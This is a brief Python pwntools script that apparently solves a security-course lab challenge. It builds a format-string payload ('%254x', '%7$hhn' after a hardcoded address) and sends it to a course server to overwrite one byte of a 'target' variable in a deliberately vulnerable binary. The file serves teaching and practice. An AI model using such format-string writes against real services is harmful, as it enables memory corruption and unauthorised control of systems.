from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25195

s = process('./program/05_write_specific_byte', shell=True)

elf = ELF('./program/05_write_specific_byte')
target_addr = elf.symbols['target'] + 0x3 

print(f"Target addresses to write the integer: \
    \n{hex(target_addr)} \
      \n{hex(target_addr+1)} \
          \n{hex(target_addr+2)} \
              \n{hex(target_addr+3)}")

target_addr_bytes = p32(target_addr)
print(f"Target address bytes: {target_addr_bytes}")

s = remote(SERVER, PORT, timeout=9999)
s.sendline(b'\x47\xc0\x04\x08' + b'%254x' + b'%7$hhn') # address corresponds to 4 chars written
response = s.recv().decode(errors='ignore')
s.close()
print(response)